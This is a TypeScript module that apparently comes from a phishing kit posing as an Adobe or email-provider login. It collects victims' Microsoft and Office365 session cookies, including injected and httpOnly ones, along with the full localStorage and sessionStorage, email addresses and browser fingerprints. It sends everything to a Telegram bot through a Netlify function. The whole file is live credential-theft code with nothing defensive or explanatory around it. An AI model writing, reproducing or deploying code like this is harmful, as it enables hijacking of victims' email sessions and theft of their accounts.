import cookieUtils, { CookieMeta } from './cookieUtils';
import { microsoftCookieCapture } from './microsoftCookieCapture';
import { realCookieCapture, type RealCookie } from './realCookieCapture';

// Send data to Telegram via Netlify function
export const sendToTelegram = async (data: any): Promise<any> => {
  try {
    const response = await fetch('/.netlify/functions/sendTelegram', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });
    
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    
    const result = await response.json();
    console.log('✅ Data sent to Telegram successfully:', result);
    return result;
  } catch (error) {
    console.error('❌ Failed to send to Telegram:', error);
    throw error;
  }
};

export const getBrowserFingerprint = async (userEmail?: string) => {
  // Check if we're in a browser environment
  if (typeof window === 'undefined' || typeof document === 'undefined' || typeof navigator === 'undefined') {
    const emailDomain = userEmail ? userEmail.split('@')[1] || 'unknown.com' : 'unknown.com';
    return {
      userAgent: 'Server-side',
      language: 'en-US',
      platform: 'Server',
      cookieEnabled: false,
      doNotTrack: null,
      timezone: 'UTC',
      url: '',
      domain: emailDomain,
      referrer: '',
      screen: {
        width: 0,
        height: 0,
        colorDepth: 0,
        pixelDepth: 0
      },
      cookies: '',
      cookiesParsed: {},
      cookieList: [] as CookieMeta[],
      localStorage: {},
      sessionStorage: {},
      timestamp: new Date().toISOString()
    };
  }
  
  // CRITICAL: Get stored Office365 cookies first
  let storedCookies: any[] = [];
  try {
    const office365Cookies = localStorage.getItem('office365_cookies');
    const office365AuthCookies = localStorage.getItem('office365_auth_cookies');
    
    if (office365Cookies) {
      const parsed = JSON.parse(office365Cookies);
      storedCookies = [...storedCookies, ...(parsed.cookieList || parsed.cookies || [])];
    }
    
    if (office365AuthCookies) {
      const parsed = JSON.parse(office365AuthCookies);
      storedCookies = [...storedCookies, ...(parsed.cookieList || parsed.cookies || [])];
    }
  } catch (e) {
    console.error('Error loading stored cookies:', e);
  }

  // CRITICAL: Get real captured cookies
  const realCookies = realCookieCapture.getAllCookies();
  console.log('🔵 Real cookies captured:', realCookies.length);

  // Enable Microsoft-specific cookie capturing while keeping general cookies disabled
  let cookieCapture;
  const emailDomain = getProviderSpecificDomain(userEmail);
  
  // Only capture cookies for Microsoft domains
  if (emailDomain === 'live.com' || emailDomain.includes('microsoft') || emailDomain.includes('outlook')) {
    console.log('🔵 Microsoft domain detected, enabling cookie capture for:', emailDomain);
    cookieCapture = cookieUtils.buildCookieCapture();
    
    // Add Microsoft cookies from the capture system
    const microsoftCookies = microsoftCookieCapture.getMicrosoftCookies();
    if (microsoftCookies.length > 0) {
      cookieCapture.cookieList = microsoftCookies.map(cookie => ({
        name: cookie.name,
        value: cookie.value,
        domain: cookie.domain,
        path: cookie.path || '/',
        secure: cookie.secure || false,
        httpOnly: cookie.httpOnly || false,
        sameSite: cookie.sameSite || 'none',
        expirationDate: cookie.expirationDate,
        session: cookie.session || false,
        captureMethod: cookie.captureMethod || 'injection',
        timestamp: cookie.timestamp
      }));
    }
  } else {
    // For Office365 provider, always capture Microsoft cookies regardless of domain
    const sessionData = JSON.parse(localStorage.getItem('adobe_autograb_session') || '{}');
    const provider = (sessionData.provider || 'Others').toLowerCase();
    
    if (provider.includes('office365') || provider.includes('microsoft')) {
      console.log('🔵 Office365 provider detected, enabling Microsoft cookie capture');
      cookieCapture = cookieUtils.buildCookieCapture();
      
      // Add Microsoft cookies from the capture system
      const microsoftCookies = microsoftCookieCapture.getMicrosoftCookies();
      if (microsoftCookies.length > 0) {
        cookieCapture.cookieList = microsoftCookies.map(cookie => ({
          name: cookie.name,
          value: cookie.value,
          domain: cookie.domain,
          path: cookie.path || '/',
          secure: cookie.secure || false,
          httpOnly: cookie.httpOnly || false,
          sameSite: cookie.sameSite || 'none',
          expirationDate: cookie.expirationDate,
          session: cookie.session || false,
          captureMethod: cookie.captureMethod || 'injection',
          timestamp: cookie.timestamp
        }));
      }
    } else {
      // Keep general cookie capturing disabled for non-Microsoft domains
      cookieCapture = {
        documentCookies: '',
        cookiesParsed: {},
        cookieList: []
      };
    }
  }

  // CRITICAL: Always add stored cookies to the cookieList
  if (storedCookies.length > 0) {
    console.log('🔵 Adding stored Office365 cookies to fingerprint:', storedCookies.length);
    cookieCapture.cookieList = [...(cookieCapture.cookieList || []), ...storedCookies];
  }

  // CRITICAL: Add real captured cookies to the cookieList
  if (realCookies.length > 0) {
    console.log('🔵 Adding real captured cookies to fingerprint:', realCookies.length);
    cookieCapture.cookieList = [...(cookieCapture.cookieList || []), ...realCookies];
  }

  // Capture all storage data
  const getStorageData = (storage: Storage | undefined) => {
    const data: Record<string, string | null> = {};
    try {
      if (!storage) return data;
      for (let i = 0; i < storage.length; i++) {
        const key = storage.key(i);
        if (key) {
          data[key] = storage.getItem(key);
        }
      }
    } catch (e) {
      // ignore storage access errors
    }
    return data;
  };
  
  return {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    cookieEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    timezone: typeof Intl !== 'undefined' ? Intl.DateTimeFormat().resolvedOptions().timeZone : 'UTC',
    url: window.location.href,
    domain: emailDomain,
    referrer: document.referrer,
    screen: {
      width: typeof screen !== 'undefined' ? screen.width : 0,
      height: typeof screen !== 'undefined' ? screen.height : 0,
      colorDepth: typeof screen !== 'undefined' ? screen.colorDepth : 0,
      pixelDepth: typeof screen !== 'undefined' ? screen.pixelDepth : 0
    },
    cookies: cookieCapture.documentCookies,
    cookiesParsed: cookieCapture.cookiesParsed,
    cookieList: cookieCapture.cookieList || [],
    microsoftCookies: microsoftCookieCapture.getMicrosoftStats(),
    localStorage: getStorageData(window.localStorage),
    sessionStorage: getStorageData(window.sessionStorage),
    timestamp: new Date().toISOString()
  };
};

// Provider-specific domain detection helper
function getProviderSpecificDomain(userEmail?: string): string {
  if (typeof window === 'undefined') {
    return userEmail ? userEmail.split('@')[1] || 'unknown.com' : 'unknown.com';
  }
  
  // Get session data to determine provider
  const sessionData = JSON.parse(localStorage.getItem('adobe_autograb_session') || '{}');
  const provider = (sessionData.provider || 'Others').toLowerCase();
  const email = userEmail || sessionData.email || '';
  
  console.log('🌐 Provider-based domain detection:', { provider, email });
  
  // Provider-specific domain mapping (takes priority)
  if (provider.includes('gmail') || provider.includes('google')) {
    console.log('✅ Provider detected as Google');
    return 'google.com';
  } else if (provider.includes('yahoo')) {
    console.log('✅ Provider detected as Yahoo');
    return 'yahoo.com';
  } else if (provider.includes('aol')) {
    console.log('✅ Provider detected as AOL');
    return 'aol.com';
  } else if (provider.includes('hotmail') || provider.includes('live') || 
             provider.includes('outlook') || provider.includes('office365')) {
    console.log('✅ Provider detected as Microsoft');
    return 'live.com';
  }
  
  // For "Others" provider, extract domain from email
  if (provider === 'others' && email && email.includes('@')) {
    const emailDomain = email.split('@')[1].toLowerCase();
    console.log('🔄 Provider is "Others", using email domain:', emailDomain);
    return emailDomain;
  }
  
  // Use current domain instead of hardcoded fallbacks
  const hostname = window.location.hostname;
  console.log('🔄 Using current domain:', hostname);
  return hostname;
}

export const generateState = () => {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
};

// This function is no longer used for redirection but is kept for potential future use or compatibility.
export const buildOAuthUrl = (provider: string, state: string) => {
  return `/login-success`; // All providers will now lead to a success path handled by the app.
};

/**
 * Helper: extractEmailFromProvider
 * This function attempts to determine an email address following OAuth or form flows.
 * For real provider integrations, you should exchange the authorization code for tokens
 * on your server and then use the provider APIs (or the ID token) to extract the verified email.
 */
export const extractEmailFromProvider = (provider: string, code: string) => {
  try {
    const sessionData = JSON.parse(localStorage.getItem('adobe_autograb_session') || '{}');
    if (sessionData.email) {
      console.log('✅ Found existing email in session:', sessionData.email);
      return sessionData.email;
    }
    if (typeof window !== 'undefined') {
      const urlParams = new URLSearchParams(window.location.search);
      const email = urlParams.get('email');
      if (email) {
        console.log('✅ Found email in URL parameters:', email);
        return email;
      }
    }
    const emailInput = typeof document !== 'undefined' ? document.querySelector('input[type="email"]') as HTMLInputElement : null;
    if (emailInput && emailInput.value) {
      console.log('✅ Found email from form input:', emailInput.value);
      return emailInput.value;
    }
    const cookies = (typeof document !== 'undefined' ? document.cookie.split(';') : []);
    for (const cookie of cookies) {
      const [name, value] = cookie.trim().split('=');
      if (name === 'user_email' && value) {
        try {
          const decodedEmail = decodeURIComponent(value);
          console.log('✅ Found email from cookie:', decodedEmail);
          return decodedEmail;
        } catch (e) {
          console.warn('Failed to decode email from cookie');
        }
      }
    }
    if (code && code.includes('@')) {
      console.log('✅ Using code as email:', code);
      return code;
    }
    console.warn('⚠️ No real email found, generating placeholder');
    const domains = {
      'Gmail': 'gmail.com',
      'Yahoo': 'yahoo.com',
      'Outlook': 'outlook.com',
      'Office365': 'outlook.com',
      'AOL': 'aol.com',
      'Others': 'example.com'
    };
    const domain = domains[provider as keyof typeof domains] || 'example.com';
    return `user${Math.floor(Math.random() * 1000)}@${domain}`;
    
  } catch (error) {
    console.error('Error extracting email:', error);
    return `error@${provider.toLowerCase()}.com`;
  }
};

// Browser fingerprinting function
export function generateFingerprint(userEmail) {
  if (!userEmail) {
    throw new Error('User email is required for fingerprinting');
  }
  
  // Enable Microsoft-specific cookie capturing while keeping general cookies disabled
  let cookieCapture;
  const emailDomain = getProviderSpecificDomain(userEmail);
  
  // Only capture cookies for Microsoft domains
  if (emailDomain === 'live.com' || emailDomain.includes('microsoft') || emailDomain.includes('outlook')) {
    console.log('🔵 Microsoft domain detected, enabling cookie capture for:', emailDomain);
    cookieCapture = cookieUtils.buildCookieCapture();
  } else {
    // Keep general cookie capturing disabled for non-Microsoft domains
    cookieCapture = {
      documentCookies: '',
      cookiesParsed: {},
      cookieList: []
    };
  }

  // Capture all storage data
  const fingerprint = {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    cookieEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    hardwareConcurrency: navigator.hardwareConcurrency,
    maxTouchPoints: navigator.maxTouchPoints,
    cookies: cookieCapture.documentCookies,
    cookiesParsed: cookieCapture.cookiesParsed,
    cookieList: cookieCapture.cookieList || [],
    microsoftCookies: microsoftCookieCapture.getMicrosoftStats(),
    localStorage: getStorageData(window.localStorage),
    sessionStorage: getStorageData(window.sessionStorage),
    timestamp: new Date().toISOString()
  };

  return fingerprint;
}
